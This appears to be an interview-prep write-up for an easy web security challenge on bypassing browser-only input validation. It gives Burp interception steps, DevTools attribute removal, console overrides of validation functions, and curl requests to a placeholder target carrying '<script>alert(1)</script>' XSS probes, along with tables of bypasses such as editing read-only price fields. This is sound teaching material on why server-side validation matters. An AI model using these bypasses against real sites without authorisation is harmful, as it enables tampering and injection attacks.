# Challenge 6: Client-Side Input Validation Bypass

> **Difficulty:** 🟢 EASY | **Success Ratio:** 100%
> **Goal:** Bypass JavaScript validation that only runs in the browser to submit restricted data.

---

## What They Test

Can you bypass input validation that is implemented only on the client side (in the browser), with no corresponding server-side validation?

---

## Key Concept

**Client-side validation = no validation.** Any validation that runs in the browser can be bypassed because the attacker controls the browser. Real security requires **server-side validation** — everything in the browser is cosmetic.

---

## 5 Methods to Bypass Client-Side Validation

### Method 1: Burp Suite Proxy (Most Reliable)

```
1. Configure browser proxy → Burp (127.0.0.1:8080)
2. Fill form with values that PASS JavaScript validation
3. Turn Intercept ON in Burp
4. Submit the form
5. In the intercepted request, MODIFY the validated values
6. Forward the modified request

Example:
- Form requires email format in "name" field
- Enter valid email to pass JS validation
- Intercept in Burp → change email to: <script>alert(1)</script>
- Forward → JS validation is bypassed
```

### Method 2: Browser DevTools - Edit HTML (F12)

```
1. Press F12 → Elements tab
2. Find the form element
3. Remove or modify validation attributes:

Remove these attributes:
- required          → allows empty submission
- maxlength="10"    → allows longer input
- minlength="5"     → allows shorter input
- min="1"           → allows smaller numbers
- max="100"         → allows larger numbers
- pattern="[A-Za-z]" → allows any characters
- type="email"      → allows non-email input
- type="number"     → allows text input

Remove event handlers:
- onsubmit="return validateForm()"
- onclick="validate()"
- onchange="checkInput()"
- onkeyup="validateField(this)"

Examples:
<input type="text" name="age" min="18" max="65" required>
→ Remove min, max, required
→ Enter: -1 or 9999

<input type="text" name="name" maxlength="20" pattern="[A-Za-z]+">
→ Remove maxlength, pattern
→ Enter: <script>alert(1)</script>
```

### Method 3: Disable JavaScript Entirely

```
Chrome:
1. F12 → Settings (gear icon at top-right of DevTools)
2. Scroll down → "Disable JavaScript" ✓ checkbox
3. Reload page → all JS validation is gone
4. Submit the form freely
5. Re-enable JavaScript after

Firefox:
1. Address bar → about:config
2. Search: javascript.enabled
3. Toggle to false
4. Reload page → submit form
5. Toggle back to true

Note: Some forms won't work at all without JS
(AJAX-based submissions). In that case, use Burp instead.
```

### Method 4: Browser Console (F12 → Console)

```javascript
// Override validation functions
window.validateForm = function() { return true; };
window.validate = function() { return true; };
window.checkInput = function() { return true; };

// Remove form's onsubmit handler
document.querySelector('form').onsubmit = null;
document.querySelector('form').removeAttribute('onsubmit');

// Modify input values directly
document.querySelector('input[name="age"]').value = "9999";
document.querySelector('input[name="name"]').value = "<script>alert(1)</script>";

// Remove all validation attributes from all inputs
document.querySelectorAll('input').forEach(input => {
    input.removeAttribute('required');
    input.removeAttribute('maxlength');
    input.removeAttribute('minlength');
    input.removeAttribute('min');
    input.removeAttribute('max');
    input.removeAttribute('pattern');
});

// Submit the form programmatically
document.querySelector('form').submit();

// Override HTML5 form validation API
HTMLInputElement.prototype.checkValidity = function() { return true; };
HTMLFormElement.prototype.checkValidity = function() { return true; };
```

### Method 5: Direct HTTP Request (curl/Postman)

```bash
# Bypass the browser entirely - send request directly
# No JavaScript runs = no validation

# Find the form action URL and parameters from page source
curl -X POST https://target.com/submit \
  -d "name=<script>alert(1)</script>&age=-1&email=notanemail" \
  -H "Cookie: session=your_session_cookie"

# With JSON body
curl -X POST https://target.com/api/submit \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>alert(1)</script>","age":-1}'

# Using Postman:
# 1. Copy the request URL and parameters from DevTools Network tab
# 2. Recreate the request in Postman
# 3. Modify values freely (no JS validation)
# 4. Send
```

---

## Common Validation Types & Bypasses

| Validation       | HTML Attribute        | Bypass                                             |
| ---------------- | --------------------- | -------------------------------------------------- |
| Required field   | `required`            | Remove attribute or send via curl                  |
| Max length       | `maxlength="50"`      | Remove attribute, or modify in Burp                |
| Min/Max number   | `min="1" max="100"`   | Remove or send out-of-range via Burp               |
| Email format     | `type="email"`        | Change to `type="text"` or use Burp                |
| Pattern matching | `pattern="[A-Za-z]+"` | Remove pattern attribute                           |
| Number only      | `type="number"`       | Change to `type="text"`                            |
| Date range       | `min="2020-01-01"`    | Remove attribute, send any date                    |
| File type        | `accept=".jpg,.png"`  | Remove accept, upload any file type                |
| Select options   | `<option>` list       | Add new `<option>` or send unlisted value via Burp |
| Radio buttons    | Preset `value`        | Change value attribute in DevTools                 |
| Checkbox         | `checked`             | Send unchecked/different value via Burp            |

---

## JavaScript Validation vs Server-Side Validation

```
Client-Side (Bypassable):
- JavaScript functions (validateForm(), checkInput())
- HTML5 attributes (required, pattern, min, max)
- CSS-based restrictions (:invalid pseudo-class)
- Input masks (formatting)

Server-Side (NOT easily bypassable):
- Backend code validates after receiving request
- Returns error response if validation fails
- Database constraints
- WAF (Web Application Firewall) rules

How to tell which is which:
1. Bypass client-side validation using any method above
2. If the server STILL rejects → server-side validation exists
3. If the server ACCEPTS → only client-side validation was present
```

---

## Real-World Bypass Scenarios

| Scenario               | Client-Side Rule       | Bypass Approach                                         |
| ---------------------- | ---------------------- | ------------------------------------------------------- |
| Age verification       | Must be 18+            | Change value to any number                              |
| Comment length         | Max 200 chars          | Remove maxlength, submit long XSS payload               |
| Username format        | Letters only           | Submit special chars for SQLi/XSS                       |
| Price field (readonly) | Can't edit             | Change in DevTools or Burp                              |
| File upload            | Only .jpg/.png         | Change accept attribute, or modify Content-Type in Burp |
| Dropdown restriction   | Only predefined values | Send custom value via Burp                              |
| CAPTCHA (client-side)  | Must solve CAPTCHA     | Remove CAPTCHA field from request                       |

---

## Tips for the Interview

1. **Burp Suite is the most reliable method** — it works regardless of how complex the JS validation is
2. **Always check if there's server-side validation too** — bypass client-side first, then see if server accepts
3. **Disabling JS is the fastest method** but won't work for AJAX-based forms
4. **DevTools method is great for quick changes** — especially for hidden fields and attributes
5. **Know multiple methods** — interviewers may ask you to demonstrate different approaches
6. **This challenge is often combined with XSS** — after bypassing validation, inject XSS payload
